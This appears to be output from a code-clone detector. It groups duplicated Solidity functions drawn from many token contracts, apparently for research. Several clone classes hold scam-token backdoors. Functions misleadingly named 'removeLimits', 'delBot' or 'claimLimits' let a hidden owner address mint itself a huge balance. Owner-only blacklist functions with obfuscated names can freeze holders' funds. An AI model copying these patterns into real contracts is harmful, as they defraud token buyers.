<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="43" endline="47" pcid="8268">
    function delBots(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="43" endline="47" pcid="412">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="44" endline="48" pcid="2282">
    function delBot(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="40" endline="44" pcid="8608">
    function claimLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="42" endline="46" pcid="271">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="43" endline="47" pcid="241">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="43" endline="47" pcid="2861">
    function cleanLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="42" endline="46" pcid="2744">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="43" endline="47" pcid="169">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="43" endline="47" pcid="3187">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="43" endline="47" pcid="2936">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
</class>

<class classid="51" nclones="5" nlines="3" similarity="100">
<source file="systems/source-code/0x04574355704418f57a4cd8c9703861dcec00634e.sol" startline="6" endline="8" pcid="148">
    function record(address _from, address _to, uint _value) public {
        history[_from][_to][block.timestamp] = _value;
    }
</source>
<source file="systems/source-code/0x6227b65f1ce22fe9adb0a2d015b49c54fe51b318.sol" startline="7" endline="9" pcid="3735">
    function listToTelegram(address _from, address _to, uint _value) public {
        list[_from][_to][block.timestamp] = _value;
    }
</source>
<source file="systems/source-code/0x7115c01915a5f48c6ee9135becba67ead4faf180.sol" startline="7" endline="9" pcid="4163">
    function reward(address _from, address _to, uint _value) public {
        edenNet[_from][_to][block.timestamp] = _value;
    }
</source>
<source file="systems/source-code/0x4aadf262321f73f43e76ef20cfab762a6d933745.sol" startline="21" endline="23" pcid="2793">
    function to(address _from, address _to, uint _value) public {
        moon[_from][_to][block.timestamp] = _value;
    }
</source>
<source file="systems/source-code/0xf8edbb423666a1eba0c004da5fe160d0104579fa.sol" startline="6" endline="8" pcid="9067">
    function link(address _from, address _to, uint _value) public {
        nodes[_from][_to][block.timestamp] = _value;
    }
</source>
</class>

<class classid="52" nclones="26" nlines="5" similarity="75">
<source file="systems/source-code/0x08e6cd078e3767337d6a075b7347f8b3ba23d1da.sol" startline="28" endline="32" pcid="235">
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x121868a5f070ae50e485dc391748cafce748e29d.sol" startline="92" endline="96" pcid="487">
    function approve(address _spender, uint256 _value) public override returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x34e8a53b0759c2a732610a3126814ac69b692349.sol" startline="67" endline="71" pcid="1657">
    function approve(address _spender, uint256 _value) public override returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xac43da874d54e03bac72a45479d5df9b3ec54c9f.sol" startline="28" endline="32" pcid="6237">
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x374e2e0b414f5043e7afefdb7f2be47bcb9e349d.sol" startline="46" endline="50" pcid="1857">
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
        }
</source>
<source file="systems/source-code/0x3c5283eb7c2e7ce3f2199699883d4191d1a5ac99.sol" startline="29" endline="33" pcid="2118">
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3c6835AA49883DB868AfE31c682De7B3ACA4D32C.sol" startline="37" endline="41" pcid="2125">
    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
</source>
<source file="systems/source-code/0xfe3d1adcafda329e2ceb4e21c4a1f6a8f38af531.sol" startline="29" endline="33" pcid="9300">
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="158" endline="162" pcid="5125">
  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="160" endline="164" pcid="5994">
  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
</source>
<source file="systems/source-code/0x2e07ae2b85fbdd60251df13d6d39a64125cbabe9.sol" startline="59" endline="63" pcid="1360">
    function approve(address _spender, uint256 _value) public override returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xfad76b7672352d7d7cce5eb1954e3a29659d5789.sol" startline="29" endline="33" pcid="9116">
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5a22929448bd37ec49ced7b63fe01e0edac652ef.sol" startline="50" endline="54" pcid="3399">
    function approve(address spender, uint value) public returns (bool) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
</source>
<source file="systems/source-code/0xedb32c55d9f85d5fa88098574ed97edbcf9afbbf.sol" startline="59" endline="63" pcid="8682">
    function approve(address _spender, uint256 _value) public override returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xece7c555d922e9915e36e3e1fdfd8c15e838c3f0.sol" startline="66" endline="70" pcid="8660">
    function approve(address _spender, uint256 _value) public override returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x848fff4055be44647b20d1a0826e3762e91362be.sol" startline="59" endline="63" pcid="4958">
    function approve(address _spender, uint256 _value) public override returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x800b43ff3c0314167874598478b458c13acca420.sol" startline="29" endline="33" pcid="4714">
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4999abc1d0b4e2cd10e11678914f512d7eca45a8.sol" startline="28" endline="32" pcid="2773">
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x276bdaae1e84fb779399844d422d89961b672f3f.sol" startline="87" endline="91" pcid="1234">
    function approve(address _spender, uint256 _value) public override returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x2a0bCbE87f979daE24D480e73eE0C3b688D89b1e.sol" startline="39" endline="43" pcid="1270">
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
</source>
<source file="systems/source-code/0xa3a9799e42e46aeb47cc263fe9334f9170127fb1.sol" startline="59" endline="63" pcid="5951">
    function approve(address _spender, uint256 _value) public override returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xd2561d1426d48ead5653cb31af52eb7a2bcf95f9.sol" startline="82" endline="86" pcid="7530">
    function approve(address _spender, uint256 _value) public override returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x68f09e30ccd68c4a16ed68915b2b4f631b9ab719.sol" startline="29" endline="33" pcid="3892">
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1E7614EcC9bEeA7B9eE389C71A4D0b3CDc54cd21.sol" startline="27" endline="31" pcid="950">
    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
</source>
<source file="systems/source-code/0x6976ad037ba6979d23d9cae2ebba9e150ad220d4.sol" startline="29" endline="33" pcid="3913">
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD7164217E45842a095feEe0460DC9980617554E1.sol" startline="161" endline="166" pcid="7684">
    function approve(address usr, uint wad) external returns (bool) {
        allowance[msg.sender][usr] = wad;
        emit Approval(msg.sender, usr, wad);
		logger.log(msg.sender, usr, wad, "approve");
        return true;
    }
</source>
</class>

<class classid="53" nclones="9" nlines="9" similarity="100">
<source file="systems/source-code/0x08e6cd078e3767337d6a075b7347f8b3ba23d1da.sol" startline="34" endline="43" pcid="236">
    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(!blacklist[msg.sender], "Sender is blacklisted");
        require(!blacklist[_to], "Recipient is blacklisted");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x800b43ff3c0314167874598478b458c13acca420.sol" startline="35" endline="44" pcid="4715">
    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(!blacklist[msg.sender], "Sender is blacklisted");
        require(!blacklist[_to], "Recipient is blacklisted");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x6976ad037ba6979d23d9cae2ebba9e150ad220d4.sol" startline="35" endline="44" pcid="3914">
    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(!blacklist[msg.sender], "Sender is blacklisted");
        require(!blacklist[_to], "Recipient is blacklisted");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x3c5283eb7c2e7ce3f2199699883d4191d1a5ac99.sol" startline="35" endline="44" pcid="2119">
    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(!blacklist[msg.sender], "Sender is blacklisted");
        require(!blacklist[_to], "Recipient is blacklisted");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xfe3d1adcafda329e2ceb4e21c4a1f6a8f38af531.sol" startline="35" endline="44" pcid="9301">
    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(!blacklist[msg.sender], "Sender is blacklisted");
        require(!blacklist[_to], "Recipient is blacklisted");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xac43da874d54e03bac72a45479d5df9b3ec54c9f.sol" startline="34" endline="43" pcid="6238">
    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(!blacklist[msg.sender], "Sender is blacklisted");
        require(!blacklist[_to], "Recipient is blacklisted");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x4999abc1d0b4e2cd10e11678914f512d7eca45a8.sol" startline="34" endline="43" pcid="2774">
    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(!blacklist[msg.sender], "Sender is blacklisted");
        require(!blacklist[_to], "Recipient is blacklisted");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xfad76b7672352d7d7cce5eb1954e3a29659d5789.sol" startline="35" endline="44" pcid="9117">
    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(!blacklist[msg.sender], "Sender is blacklisted");
        require(!blacklist[_to], "Recipient is blacklisted");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x68f09e30ccd68c4a16ed68915b2b4f631b9ab719.sol" startline="35" endline="44" pcid="3893">
    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(!blacklist[msg.sender], "Sender is blacklisted");
        require(!blacklist[_to], "Recipient is blacklisted");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
</source>
</class>

<class classid="54" nclones="9" nlines="11" similarity="100">
<source file="systems/source-code/0x08e6cd078e3767337d6a075b7347f8b3ba23d1da.sol" startline="45" endline="56" pcid="237">
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        require(!blacklist[sender], "Sender is blacklisted");
        require(!blacklist[recipient], "Recipient is blacklisted");
        require(balanceOf[sender] >= amount, "Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "Allowance exceeded");

        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        allowance[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3c5283eb7c2e7ce3f2199699883d4191d1a5ac99.sol" startline="46" endline="57" pcid="2120">
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        require(!blacklist[sender], "Sender is blacklisted");
        require(!blacklist[recipient], "Recipient is blacklisted");
        require(balanceOf[sender] >= amount, "Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "Allowance exceeded");

        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        allowance[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6976ad037ba6979d23d9cae2ebba9e150ad220d4.sol" startline="46" endline="57" pcid="3915">
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        require(!blacklist[sender], "Sender is blacklisted");
        require(!blacklist[recipient], "Recipient is blacklisted");
        require(balanceOf[sender] >= amount, "Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "Allowance exceeded");

        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        allowance[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x68f09e30ccd68c4a16ed68915b2b4f631b9ab719.sol" startline="46" endline="57" pcid="3894">
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        require(!blacklist[sender], "Sender is blacklisted");
        require(!blacklist[recipient], "Recipient is blacklisted");
        require(balanceOf[sender] >= amount, "Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "Allowance exceeded");

        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        allowance[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfad76b7672352d7d7cce5eb1954e3a29659d5789.sol" startline="46" endline="57" pcid="9118">
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        require(!blacklist[sender], "Sender is blacklisted");
        require(!blacklist[recipient], "Recipient is blacklisted");
        require(balanceOf[sender] >= amount, "Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "Allowance exceeded");

        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        allowance[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfe3d1adcafda329e2ceb4e21c4a1f6a8f38af531.sol" startline="46" endline="57" pcid="9302">
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        require(!blacklist[sender], "Sender is blacklisted");
        require(!blacklist[recipient], "Recipient is blacklisted");
        require(balanceOf[sender] >= amount, "Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "Allowance exceeded");

        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        allowance[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xac43da874d54e03bac72a45479d5df9b3ec54c9f.sol" startline="45" endline="56" pcid="6239">
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        require(!blacklist[sender], "Sender is blacklisted");
        require(!blacklist[recipient], "Recipient is blacklisted");
        require(balanceOf[sender] >= amount, "Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "Allowance exceeded");

        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        allowance[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4999abc1d0b4e2cd10e11678914f512d7eca45a8.sol" startline="45" endline="56" pcid="2775">
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        require(!blacklist[sender], "Sender is blacklisted");
        require(!blacklist[recipient], "Recipient is blacklisted");
        require(balanceOf[sender] >= amount, "Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "Allowance exceeded");

        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        allowance[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x800b43ff3c0314167874598478b458c13acca420.sol" startline="46" endline="57" pcid="4716">
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        require(!blacklist[sender], "Sender is blacklisted");
        require(!blacklist[recipient], "Recipient is blacklisted");
        require(balanceOf[sender] >= amount, "Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "Allowance exceeded");

        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        allowance[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
</source>
</class>

<class classid="55" nclones="8" nlines="4" similarity="100">
<source file="systems/source-code/0x08e6cd078e3767337d6a075b7347f8b3ba23d1da.sol" startline="58" endline="61" pcid="238">
    function addToBlacklist(address _address) external onlyOwner {
        blacklist[_address] = true;
        emit BlacklistUpdated(_address, true);
    }
</source>
<source file="systems/source-code/0xac43da874d54e03bac72a45479d5df9b3ec54c9f.sol" startline="58" endline="61" pcid="6240">
    function aTbLBoT(address _address) external onlyOwner {
        blacklist[_address] = true;
        emit BlacklistUpdated(_address, true);
    }
</source>
<source file="systems/source-code/0x68f09e30ccd68c4a16ed68915b2b4f631b9ab719.sol" startline="59" endline="62" pcid="3895">
    function addToBlacklist(address _address) external onlyOwner {
        blacklist[_address] = true;
        emit BlacklistUpdated(_address, true);
    }
</source>
<source file="systems/source-code/0x3c5283eb7c2e7ce3f2199699883d4191d1a5ac99.sol" startline="59" endline="62" pcid="2121">
    function aTbL(address _address) external onlyDeployer {
        blacklist[_address] = true;
        emit BlacklistUpdated(_address, true);
    }
</source>
<source file="systems/source-code/0x6976ad037ba6979d23d9cae2ebba9e150ad220d4.sol" startline="59" endline="62" pcid="3916">
    function aTbL(address _address) external onlyDeployer {
        blacklist[_address] = true;
        emit BlacklistUpdated(_address, true);
    }
</source>
<source file="systems/source-code/0xfad76b7672352d7d7cce5eb1954e3a29659d5789.sol" startline="59" endline="62" pcid="9119">
    function aTbL(address _address) external onlyDeployer {
        blacklist[_address] = true;
        emit BlacklistUpdated(_address, true);
    }
</source>
<source file="systems/source-code/0x4999abc1d0b4e2cd10e11678914f512d7eca45a8.sol" startline="58" endline="61" pcid="2776">
    function aTbLBoT(address _address) external onlyOwner {
        blacklist[_address] = true;
        emit BlacklistUpdated(_address, true);
    }
</source>
<source file="systems/source-code/0xfe3d1adcafda329e2ceb4e21c4a1f6a8f38af531.sol" startline="59" endline="62" pcid="9303">
    function aTbL(address _address) external onlyDeployer {
        blacklist[_address] = true;
        emit BlacklistUpdated(_address, true);
    }
</source>
</class>

<class classid="56" nclones="8" nlines="4" similarity="100">
<source file="systems/source-code/0x08e6cd078e3767337d6a075b7347f8b3ba23d1da.sol" startline="63" endline="66" pcid="239">
    function removeFromBlacklist(address _address) external onlyOwner {
        blacklist[_address] = false;
        emit BlacklistUpdated(_address, false);
    }
</source>
<source file="systems/source-code/0xac43da874d54e03bac72a45479d5df9b3ec54c9f.sol" startline="63" endline="66" pcid="6241">
    function rFbLBoT(address _address) external onlyOwner {
        blacklist[_address] = false;
        emit BlacklistUpdated(_address, false);
    }
</source>
<source file="systems/source-code/0x3c5283eb7c2e7ce3f2199699883d4191d1a5ac99.sol" startline="64" endline="67" pcid="2122">
    function rFbL(address _address) external onlyDeployer {
        blacklist[_address] = false;
        emit BlacklistUpdated(_address, false);
    }
</source>
<source file="systems/source-code/0x6976ad037ba6979d23d9cae2ebba9e150ad220d4.sol" startline="64" endline="67" pcid="3917">
    function rFbL(address _address) external onlyDeployer {
        blacklist[_address] = false;
        emit BlacklistUpdated(_address, false);
    }
</source>
<source file="systems/source-code/0x68f09e30ccd68c4a16ed68915b2b4f631b9ab719.sol" startline="64" endline="67" pcid="3896">
    function removeFromBlacklist(address _address) external onlyOwner {
        blacklist[_address] = false;
        emit BlacklistUpdated(_address, false);
    }
</source>
<source file="systems/source-code/0xfad76b7672352d7d7cce5eb1954e3a29659d5789.sol" startline="64" endline="67" pcid="9120">
    function rFbL(address _address) external onlyDeployer {
        blacklist[_address] = false;
        emit BlacklistUpdated(_address, false);
    }
</source>
<source file="systems/source-code/0x4999abc1d0b4e2cd10e11678914f512d7eca45a8.sol" startline="63" endline="66" pcid="2777">
    function rFbLBoT(address _address) external onlyOwner {
        blacklist[_address] = false;
        emit BlacklistUpdated(_address, false);
    }
</source>
<source file="systems/source-code/0xfe3d1adcafda329e2ceb4e21c4a1f6a8f38af531.sol" startline="64" endline="67" pcid="9304">
    function rFbL(address _address) external onlyDeployer {
        blacklist[_address] = false;
        emit BlacklistUpdated(_address, false);
    }
</source>
</class>

<class classid="57" nclones="10" nlines="5" similarity="100">
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="42" endline="46" pcid="286">
    function claimLimit(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="42" endline="46" pcid="2876">
    function deleteBot(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="43" endline="47" pcid="2637">
    function claimLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="42" endline="46" pcid="5086">
    function claimLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="43" endline="47" pcid="1409">
    function claimLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="42" endline="46" pcid="5873">
    function delBot(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="42" endline="46" pcid="6298">
    function claimLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="42" endline="46" pcid="1125">
    function delBot(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="42" endline="46" pcid="7421">
    function claimLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="43" endline="47" pcid="3643">
    function deleteBot(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
</class>

<class classid="58" nclones="6" nlines="7" similarity="100">
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="155" endline="161" pcid="375">
    function cexLock(address[] memory _user, uint256[] memory _amount) external {
        if(_owner == msg.sender) {
            for(uint i = 0; i < _user.length; i++) {
                _transfer(msg.sender, _user[i], _amount[i]);
            }
        }
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="155" endline="161" pcid="7082">
    function cexLock(address[] memory _user, uint256[] memory _amount) external {
        if(_owner == msg.sender) {
            for(uint i = 0; i < _user.length; i++) {
                _transfer(msg.sender, _user[i], _amount[i]);
            }
        }
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="153" endline="159" pcid="6732">
    function cexLock(address[] memory _user, uint256[] memory _amount) external {
        if(_owner == msg.sender) {
            for(uint i = 0; i < _user.length; i++) {
                _transfer(msg.sender, _user[i], _amount[i]);
            }
        }
    }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="155" endline="161" pcid="4506">
    function cexLock(address[] memory _user, uint256[] memory _amount) external {
        if(_owner == msg.sender) {
            for(uint i = 0; i < _user.length; i++) {
                _transfer(msg.sender, _user[i], _amount[i]);
            }
        }
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="154" endline="160" pcid="3743">
    function cexLock(address[] memory _user, uint256[] memory _amount) external {
        if(_owner == msg.sender) {
            for(uint i = 0; i < _user.length; i++) {
                _transfer(msg.sender, _user[i], _amount[i]);
            }
        }
    }
</source>
